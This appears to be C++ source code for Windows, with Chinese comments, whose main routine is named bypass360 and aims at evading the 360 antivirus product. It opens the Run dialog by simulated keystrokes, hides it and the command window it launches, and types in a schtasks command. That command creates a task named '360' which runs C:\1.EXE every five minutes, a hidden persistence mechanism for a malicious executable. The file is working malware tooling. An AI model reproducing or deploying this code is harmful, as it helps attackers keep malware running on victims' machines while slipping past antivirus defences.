#include<windows.h>
#include<stdio.h>
HWND T=NULL;
HWND GetWindowHwndByPorcessID(DWORD dwProcessID)
{
	DWORD dwPID = 0;
	HWND hwndRet = NULL;
	// 取得第一个窗口句柄
	HWND hwndWindow = ::GetTopWindow(0);
	while (hwndWindow)
	{
		dwPID = 0;
		// 通过窗口句柄取得进程ID
		DWORD dwTheardID = ::GetWindowThreadProcessId(hwndWindow, &dwPID);
		if (dwTheardID != 0)
		{
			// 判断和参数传入的进程ID是否相等
			if (dwPID == dwProcessID)
			{
				// 进程ID相等，则记录窗口句柄
				hwndRet = hwndWindow;
				break;
			}
		}
		// 取得下一个窗口句柄
		hwndWindow = ::GetNextWindow(hwndWindow, GW_HWNDNEXT);
	}
	// 上面取得的窗口，不一定是最上层的窗口，需要通过GetParent获取最顶层窗口
	HWND hwndWindowParent = NULL;
	// 循环查找父窗口，以便保证返回的句柄是最顶层的窗口句柄
	while (hwndRet != NULL)
	{
		hwndWindowParent = ::GetParent(hwndRet);
		if (hwndWindowParent == NULL)
		{
			break;
		}
		hwndRet = hwndWindowParent;
	}
	// 返回窗口句柄
	return hwndRet;
}
#include <tlhelp32.h>

DWORD GetProcessIDByName(const char* pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(0x00000002, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
		if (strcmp(pe.szExeFile, pName) == 0) {
			CloseHandle(hSnapshot);
			printf("cmd_pid:%d\n", pe.th32ProcessID);
			return pe.th32ProcessID;
		}
		//printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
	}
	CloseHandle(hSnapshot);
	return 0;
}
void SMG(HWND id, char c) {
	PostMessage(id, WM_CHAR, c, 0);
}

BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam)
{
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2,temp1);
	if (!strcmp(temp2, "Edit")) {
		T = hWnd;
	}
	return true;
}


void bypass360() {
	keybd_event(VK_LWIN, 0, 0, 0);
	keybd_event('R', 0, 0, 0);
	keybd_event('R', 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
	HWND hq1=NULL,hq2=NULL;
	while (TRUE){
		hq1 = FindWindow( NULL,"运行");
		if (hq1 != NULL) {
			ShowWindow(hq1, SW_HIDE);
			printf("hq1:%d\n", (int)hq1);
			while (T == NULL) {
				EnumChildWindows(hq1, EnumChildProc, 0);
			}
			break;
		}
	}

	if (T == NULL) {
		printf("t is null");
		return ;
	}

	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, 'M', 0);
	SendMessage(T, WM_CHAR, 'D', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 13, 0);
	SendMessage(T, WM_KEYDOWN, VK_RETURN, 0);
	SendMessage(hq1 , WM_CHAR, 13, 0);
	SendMessage(hq1, WM_KEYDOWN, VK_RETURN, 0);
	PostMessage(T, WM_KEYDOWN, VK_RETURN, 0);
	PostMessage(T, WM_CHAR, VK_RETURN, 0);
	HWND hq = NULL;
	while (TRUE) {
		hq = GetWindowHwndByPorcessID(GetProcessIDByName("cmd.exe"));
		if (hq != NULL) {
			
			int r = ShowWindow(hq, SW_HIDE);
			printf("show:%d\n", r);
			
			break;
		}
	}
	printf("cmd:%d\n",hq);
	char a[57] = { 'S','C','H','T','A'
		,'S','K','S',VK_SPACE,'/','C'
		,'R','E','A','T','E',VK_SPACE,'/',
		'S','C',VK_SPACE,'M','I','N',
		'U','T','E',VK_SPACE,'/','M','O',VK_SPACE,
		'5',VK_SPACE,'/','T','N',VK_SPACE,'3','6','0',
		VK_SPACE,'/','T','R',VK_SPACE,'C',':','\\',
		'1','.','E','X','E',VK_SPACE,'/','F'
	};
	for (int i = 0; i <= 57; i++) {
		SMG(hq, a[i]);
	}
	PostMessage(hq, WM_CHAR, 13, 0);
	char b[5] = { 'e','x','i','t' };
	for (int i = 0; i <= 4; i++) {
		SMG(hq, b[i]);
	}
	//PostMessage(hq, WM_CHAR, 13, 0);

}
int main() {
	bypass360();
	system("pause");
}